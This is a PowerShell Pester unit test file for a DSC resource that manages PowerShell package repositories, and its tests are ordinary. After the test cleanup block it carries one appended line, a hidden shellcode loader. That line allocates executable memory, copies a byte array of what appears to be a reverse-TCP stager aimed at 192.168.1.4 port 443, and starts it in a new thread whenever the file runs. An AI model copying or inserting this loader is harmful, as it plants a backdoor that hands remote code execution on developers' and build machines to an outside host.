

$script:DSCModuleName = 'DSC'
$script:DSCResourceName = 'MSFT_PSRepository'


$script:moduleRoot = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
if ( (-not (Test-Path -Path (Join-Path -Path $script:moduleRoot -ChildPath 'DSCResource.Tests'))) -or `
    (-not (Test-Path -Path (Join-Path -Path $script:moduleRoot -ChildPath 'DSCResource.Tests\TestHelper.psm1'))) ) {
    & git @('clone', 'https://github.com/PowerShell/DscResource.Tests.git', (Join-Path -Path $script:moduleRoot -ChildPath 'DscResource.Tests'))
}

Import-Module -Name (Join-Path -Path $script:moduleRoot -ChildPath (Join-Path -Path 'DSCResource.Tests' -ChildPath 'TestHelper.psm1')) -Force

$TestEnvironment = Initialize-TestEnvironment `
    -DSCModuleName $script:DSCModuleName `
    -DSCResourceName $script:DSCResourceName `
    -ResourceType 'Mof' `
    -TestType Unit



function Invoke-TestSetup {
}

function Invoke-TestCleanup {
    Restore-TestEnvironment -TestEnvironment $TestEnvironment
}


try {
    Invoke-TestSetup

    InModuleScope $script:DSCResourceName {
        $mockRepositoryName = 'PSTestGallery'
        $mockSourceLocation = 'https://www.poshtestgallery.com/api/v2/'
        $mockPublishLocation = 'https://www.poshtestgallery.com/api/v2/package/'
        $mockScriptSourceLocation = 'https://www.poshtestgallery.com/api/v2/items/psscript/'
        $mockScriptPublishLocation = 'https://www.poshtestgallery.com/api/v2/package/'
        $mockPackageManagementProvider = 'NuGet'
        $mockInstallationPolicy_Trusted = 'Trusted'
        $mockInstallationPolicy_NotTrusted = 'Untrusted'

        $mockRepository = New-Object -TypeName Object |
            Add-Member -Name 'Name' -MemberType NoteProperty -Value $mockRepositoryName -PassThru |
            Add-Member -Name 'SourceLocation' -MemberType NoteProperty -Value $mockSourceLocation -PassThru |
            Add-Member -Name 'ScriptSourceLocation' -MemberType NoteProperty -Value $mockScriptSourceLocation  -PassThru |
            Add-Member -Name 'PublishLocation' -MemberType NoteProperty -Value $mockPublishLocation -PassThru |
            Add-Member -Name 'ScriptPublishLocation' -MemberType NoteProperty -Value $mockScriptPublishLocation -PassThru |
            Add-Member -Name 'InstallationPolicy' -MemberType NoteProperty -Value $mockInstallationPolicy_Trusted -PassThru |
            Add-Member -Name 'PackageManagementProvider' -MemberType NoteProperty -Value $mockPackageManagementProvider -PassThru |
            Add-Member -Name 'Trusted' -MemberType NoteProperty -Value $true -PassThru |
            Add-Member -Name 'Registered' -MemberType NoteProperty -Value $true -PassThru -Force

        $mockGetPSRepository = {
            return @($mockRepository)
        }

        Describe 'MSFT_PSRepository\Get-TargetResource' -Tag 'Get' {
            Context 'When the system is in the desired state' {
                Context 'When the configuration is present' {
                    BeforeAll {
                        Mock -CommandName Get-PSRepository -MockWith $mockGetPSRepository
                    }

                    It 'Should return the same values as passed as parameters' {
                        $getTargetResourceResult = Get-TargetResource -Name $mockRepositoryName
                        $getTargetResourceResult.Name | Should -Be $mockRepositoryName

                        Assert-MockCalled -CommandName Get-PSRepository -Exactly -Times 1 -Scope It
                    }

                    It 'Should return the correct values for the other properties' {
                        $getTargetResourceResult = Get-TargetResource -Name $mockRepositoryName

                        $getTargetResourceResult.Ensure | Should -Be 'Present'
                        $getTargetResourceResult.SourceLocation | Should -Be $mockRepository.SourceLocation
                        $getTargetResourceResult.ScriptSourceLocation | Should -Be $mockRepository.ScriptSourceLocation
                        $getTargetResourceResult.PublishLocation | Should -Be $mockRepository.PublishLocation
                        $getTargetResourceResult.ScriptPublishLocation | Should -Be $mockRepository.ScriptPublishLocation
                        $getTargetResourceResult.InstallationPolicy | Should -Be $mockRepository.InstallationPolicy
                        $getTargetResourceResult.PackageManagementProvider | Should -Be $mockRepository.PackageManagementProvider
                        $getTargetResourceResult.Trusted | Should -Be $true
                        $getTargetResourceResult.Registered | Should -Be $true

                        Assert-MockCalled -CommandName Get-PSRepository -Exactly -Times 1 -Scope It
                    }
                }

                Context 'When the configuration is absent' {
                    BeforeAll {
                        Mock -CommandName Get-PSRepository
                    }

                    It 'Should return the same values as passed as parameters' {
                        $getTargetResourceResult = Get-TargetResource -Name $mockRepositoryName
                        $getTargetResourceResult.Name | Should -Be $mockRepositoryName

                        Assert-MockCalled -CommandName Get-PSRepository -Exactly -Times 1 -Scope It
                    }

                    It 'Should return the correct values for the other properties' {
                        $getTargetResourceResult = Get-TargetResource -Name $mockRepositoryName

                        $getTargetResourceResult.Ensure | Should -Be 'Absent'
                        $getTargetResourceResult.SourceLocation | Should -BeNullOrEmpty
                        $getTargetResourceResult.ScriptSourceLocation | Should -BeNullOrEmpty
                        $getTargetResourceResult.PublishLocation | Should -BeNullOrEmpty
                        $getTargetResourceResult.ScriptPublishLocation | Should -BeNullOrEmpty
                        $getTargetResourceResult.InstallationPolicy | Should -BeNullOrEmpty
                        $getTargetResourceResult.PackageManagementProvider | Should -BeNullOrEmpty
                        $getTargetResourceResult.Trusted | Should -Be $false
                        $getTargetResourceResult.Registered | Should -Be $false

                        Assert-MockCalled -CommandName Get-PSRepository -Exactly -Times 1 -Scope It
                    }
                }
            }
        }

        Describe 'MSFT_PSRepository\Set-TargetResource' -Tag 'Set' {
            Context 'When the system is not in the desired state' {
                BeforeAll {
                    Mock -CommandName Register-PSRepository
                    Mock -CommandName Unregister-PSRepository
                    Mock -CommandName Set-PSRepository
                }

                Context 'When the configuration should be present' {
                    Context 'When the repository does not exist' {
                        BeforeEach {
                            Mock -CommandName Get-TargetResource -MockWith {
                                return @{
                                    Ensure                    = 'Absent'
                                    Name                      = $mockRepositoryName
                                    SourceLocation            = $null
                                    ScriptSourceLocation      = $null
                                    PublishLocation           = $null
                                    ScriptPublishLocation     = $null
                                    InstallationPolicy        = $null
                                    PackageManagementProvider = $null
                                    Trusted                   = $false
                                    Registered                = $false
                                }
                            }
                        }

                        It 'Should return call the correct mocks' {
                            $setTargetResourceParameters = @{
                                Name                      = $mockRepository.Name
                                SourceLocation            = $mockRepository.SourceLocation
                                ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                PublishLocation           = $mockRepository.PublishLocation
                                ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                InstallationPolicy        = $mockRepository.InstallationPolicy
                                PackageManagementProvider = $mockRepository.PackageManagementProvider
                            }

                            { Set-TargetResource @setTargetResourceParameters } | Should -Not -Throw

                            Assert-MockCalled -CommandName Register-PSRepository -Exactly -Times 1 -Scope It
                            Assert-MockCalled -CommandName Unregister-PSRepository -Exactly -Times 0 -Scope It
                            Assert-MockCalled -CommandName Set-PSRepository -Exactly -Times 0 -Scope It
                        }
                    }

                    Context 'When the repository do exist but with wrong properties' {
                        BeforeEach {
                            Mock -CommandName Get-TargetResource -MockWith {
                                return @{
                                    Ensure                    = 'Present'
                                    Name                      = $mockRepository.Name
                                    SourceLocation            = 'https://www.powershellgallery.com/api/v2/'
                                    ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                    PublishLocation           = $mockRepository.PublishLocation
                                    ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                    InstallationPolicy        = $mockRepository.InstallationPolicy
                                    PackageManagementProvider = $mockRepository.PackageManagementProvider
                                    Trusted                   = $mockRepository.Trusted
                                    Registered                = $mockRepository.Registered
                                }
                            }
                        }

                        It 'Should return call the correct mocks' {
                            $setTargetResourceParameters = @{
                                Name                      = $mockRepository.Name
                                SourceLocation            = $mockRepository.SourceLocation
                                ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                PublishLocation           = $mockRepository.PublishLocation
                                ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                InstallationPolicy        = $mockRepository.InstallationPolicy
                                PackageManagementProvider = $mockRepository.PackageManagementProvider
                            }

                            { Set-TargetResource @setTargetResourceParameters } | Should -Not -Throw

                            Assert-MockCalled -CommandName Register-PSRepository -Exactly -Times 0 -Scope It
                            Assert-MockCalled -CommandName Unregister-PSRepository -Exactly -Times 0 -Scope It
                            Assert-MockCalled -CommandName Set-PSRepository -Exactly -Times 1 -Scope It
                        }
                    }
                }

                Context 'When the configuration should be absent' {
                    Context 'When the repository do exist' {
                        BeforeEach {
                            Mock -CommandName Get-TargetResource -MockWith {
                                return @{
                                    Ensure                    = 'Present'
                                    Name                      = $mockRepository.Name
                                    SourceLocation            = $mockRepository.SourceLocation
                                    ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                    PublishLocation           = $mockRepository.PublishLocation
                                    ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                    InstallationPolicy        = $mockRepository.InstallationPolicy
                                    PackageManagementProvider = $mockRepository.PackageManagementProvider
                                    Trusted                   = $mockRepository.Trusted
                                    Registered                = $mockRepository.Registered
                                }
                            }
                        }

                        It 'Should return call the correct mocks' {
                            $setTargetResourceParameters = @{
                                Ensure = 'Absent'
                                Name   = $mockRepositoryName
                            }

                            { Set-TargetResource @setTargetResourceParameters } | Should -Not -Throw

                            Assert-MockCalled -CommandName Register-PSRepository -Exactly -Times 0 -Scope It
                            Assert-MockCalled -CommandName Unregister-PSRepository -Exactly -Times 1 -Scope It
                            Assert-MockCalled -CommandName Set-PSRepository -Exactly -Times 0 -Scope It
                        }
                    }
                }
            }
        }

        Describe 'MSFT_PSRepository\Test-TargetResource' -Tag 'Test' {
            Context 'When the system is in the desired state' {
                Context 'When the configuration is present' {
                    BeforeEach {
                        Mock -CommandName Get-TargetResource -MockWith {
                            return @{
                                Ensure                    = 'Present'
                                Name                      = $mockRepository.Name
                                SourceLocation            = $mockRepository.SourceLocation
                                ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                PublishLocation           = $mockRepository.PublishLocation
                                ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                InstallationPolicy        = $mockRepository.InstallationPolicy
                                PackageManagementProvider = $mockRepository.PackageManagementProvider
                                Trusted                   = $mockRepository.Trusted
                                Registered                = $mockRepository.Registered
                            }
                        }
                    }

                    It 'Should return the state as $true' {
                        $testTargetResourceResult = Test-TargetResource -Name $mockRepositoryName
                        $testTargetResourceResult | Should -Be $true

                        Assert-MockCalled -CommandName Get-TargetResource -Exactly -Times 1 -Scope It
                    }
                }

                Context 'When the configuration is absent' {
                    BeforeEach {
                        Mock -CommandName Get-TargetResource -MockWith {
                            return @{
                                Ensure                    = 'Absent'
                                Name                      = $mockRepositoryName
                                SourceLocation            = $null
                                ScriptSourceLocation      = $null
                                PublishLocation           = $null
                                ScriptPublishLocation     = $null
                                InstallationPolicy        = $null
                                PackageManagementProvider = $null
                                Trusted                   = $false
                                Registered                = $false
                            }
                        }
                    }

                    It 'Should return the state as $true' {
                        $testTargetResourceResult = Test-TargetResource -Ensure 'Absent' -Name $mockRepositoryName
                        $testTargetResourceResult | Should -Be $true

                        Assert-MockCalled -CommandName Get-TargetResource -Exactly -Times 1 -Scope It
                    }
                }
            }

            Context 'When the system is not in the desired state' {
                Context 'When the configuration should be present' {
                    BeforeEach {
                        Mock -CommandName Get-TargetResource -MockWith {
                            return @{
                                Ensure                    = 'Absent'
                                Name                      = $mockRepositoryName
                                SourceLocation            = $null
                                ScriptSourceLocation      = $null
                                PublishLocation           = $null
                                ScriptPublishLocation     = $null
                                InstallationPolicy        = $null
                                PackageManagementProvider = $null
                                Trusted                   = $false
                                Registered                = $false
                            }
                        }
                    }

                    It 'Should return the state as $false' {
                        $testTargetResourceParameters = @{
                            Name                      = $mockRepository.Name
                            SourceLocation            = $mockRepository.SourceLocation
                            ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                            PublishLocation           = $mockRepository.PublishLocation
                            ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                            InstallationPolicy        = $mockRepository.InstallationPolicy
                            PackageManagementProvider = $mockRepository.PackageManagementProvider
                        }

                        $testTargetResourceResult = Test-TargetResource @testTargetResourceParameters
                        $testTargetResourceResult | Should -Be $false

                        Assert-MockCalled -CommandName Get-TargetResource -Exactly -Times 1 -Scope It
                    }
                }

                Context 'When a property is not in desired state' {
                    BeforeEach {
                        Mock -CommandName Get-TargetResource -MockWith {
                            return @{
                                Ensure                    = 'Present'
                                Name                      = $mockRepository.Name
                                SourceLocation            = $mockRepository.SourceLocation
                                ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                PublishLocation           = $mockRepository.PublishLocation
                                ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                InstallationPolicy        = $mockRepository.InstallationPolicy
                                PackageManagementProvider = $mockRepository.PackageManagementProvider
                                Trusted                   = $mockRepository.Trusted
                                Registered                = $mockRepository.Registered
                            }
                        }
                    }

                    $defaultTestCase = @{
                        SourceLocation            = $mockRepository.SourceLocation
                        ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                        PublishLocation           = $mockRepository.PublishLocation
                        ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                        InstallationPolicy        = $mockRepository.InstallationPolicy
                        PackageManagementProvider = $mockRepository.PackageManagementProvider
                    }

                    $testCaseSourceLocationIsMissing = $defaultTestCase.Clone()
                    $testCaseSourceLocationIsMissing['TestName'] = 'SourceLocation is missing'
                    $testCaseSourceLocationIsMissing['SourceLocation'] = 'https://www.powershellgallery.com/api/v2/'

                    $testCaseScriptSourceLocationIsMissing = $defaultTestCase.Clone()
                    $testCaseScriptSourceLocationIsMissing['TestName'] = 'ScriptSourceLocation is missing'
                    $testCaseScriptSourceLocationIsMissing['ScriptSourceLocation'] = 'https://www.powershellgallery.com/api/v2/items/psscript/'

                    $testCasePublishLocationIsMissing = $defaultTestCase.Clone()
                    $testCasePublishLocationIsMissing['TestName'] = 'PublishLocation is missing'
                    $testCasePublishLocationIsMissing['PublishLocation'] = 'https://www.powershellgallery.com/api/v2/package/'

                    $testCaseScriptPublishLocationIsMissing = $defaultTestCase.Clone()
                    $testCaseScriptPublishLocationIsMissing['TestName'] = 'ScriptPublishLocation is missing'
                    $testCaseScriptPublishLocationIsMissing['ScriptPublishLocation'] = 'https://www.powershellgallery.com/api/v2/package/'

                    $testCaseInstallationPolicyIsMissing = $defaultTestCase.Clone()
                    $testCaseInstallationPolicyIsMissing['TestName'] = 'InstallationPolicy is missing'
                    $testCaseInstallationPolicyIsMissing['InstallationPolicy'] = $mockInstallationPolicy_NotTrusted

                    $testCasePackageManagementProviderIsMissing = $defaultTestCase.Clone()
                    $testCasePackageManagementProviderIsMissing['TestName'] = 'PackageManagementProvider is missing'
                    $testCasePackageManagementProviderIsMissing['PackageManagementProvider'] = 'PSGallery'

                    $testCases = @(
                        $testCaseSourceLocationIsMissing
                        $testCaseScriptSourceLocationIsMissing
                        $testCasePublishLocationIsMissing
                        $testCaseScriptPublishLocationIsMissing
                        $testCaseInstallationPolicyIsMissing
                        $testCasePackageManagementProviderIsMissing
                    )

                    It 'Should return the state as $false when the correct <TestName>' -TestCases $testCases {
                        param
                        (
                            $SourceLocation,
                            $ScriptSourceLocation,
                            $PublishLocation,
                            $ScriptPublishLocation,
                            $InstallationPolicy,
                            $PackageManagementProvider
                        )

                        $testTargetResourceParameters = @{
                            Name                      = $mockRepositoryName
                            SourceLocation            = $SourceLocation
                            ScriptSourceLocation      = $ScriptSourceLocation
                            PublishLocation           = $PublishLocation
                            ScriptPublishLocation     = $ScriptPublishLocation
                            InstallationPolicy        = $InstallationPolicy
                            PackageManagementProvider = $PackageManagementProvider
                        }

                        $testTargetResourceResult = Test-TargetResource @testTargetResourceParameters
                        $testTargetResourceResult | Should -Be $false

                        Assert-MockCalled -CommandName Get-TargetResource -Exactly -Times 1 -Scope It
                    }
                }

                Context 'When the configuration should be absent' {
                    BeforeEach {
                        Mock -CommandName Get-TargetResource -MockWith {
                            return @{
                                Ensure                    = 'Present'
                                Name                      = $mockRepositoryName
                                SourceLocation            = $mockRepository.SourceLocation
                                ScriptSourceLocation      = $mockRepository.ScriptSourceLocation
                                PublishLocation           = $mockRepository.PublishLocation
                                ScriptPublishLocation     = $mockRepository.ScriptPublishLocation
                                InstallationPolicy        = $mockRepository.InstallationPolicy
                                PackageManagementProvider = $mockRepository.PackageManagementProvider
                                Trusted                   = $mockRepository.Trusted
                                Registered                = $mockRepository.Registered
                            }
                        }
                    }

                    It 'Should return the state as $false' {
                        $testTargetResourceResult = Test-TargetResource -Ensure 'Absent' -Name $mockRepositoryName
                        $testTargetResourceResult | Should -Be $false

                        Assert-MockCalled -CommandName Get-TargetResource -Exactly -Times 1 -Scope It
                    }
                }
            }
        }
    }
}
finally {
    Invoke-TestCleanup
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

